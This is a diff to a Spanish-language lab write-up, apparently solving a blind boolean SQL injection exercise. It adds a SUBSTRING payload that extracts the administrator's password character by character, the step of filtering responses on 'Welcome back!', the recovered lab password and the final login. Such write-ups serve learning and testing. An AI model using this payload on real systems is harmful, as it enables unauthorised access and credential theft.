@@ -244,6 +244,30 @@ Longitud de caracteres que tiene el password
 
 ## Ataque de Fuerza al campo Password
 
+Utiliza una consulta que verifique si un carácter en una posición específica coincide con una letra de tu conjunto de prueba
+
 ```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a'--
 ```
+
+![Ataque password]({{site.url}}/images/SQLi/sqli-11/ataque password.png)
+
+Filtramos por las consultas que tienen la frase `Welcome back!`
+
+![Ataque password]({{site.url}}/images/SQLi/sqli-11/filtro ataque.png)
+
+Manualmente obtenemos el password
+
+![Manual]({{site.url}}/images/SQLi/sqli-11/manual.png)
+
+```javascript
+cedh8jyjns3sevnw0znp
+```
+
+## Login
+
+![Login]({{site.url}}/images/SQLi/sqli-11/login.png)
+
+## Resuelto
+
+![Login]({{site.url}}/images/SQLi/sqli-11/resuelto.png)
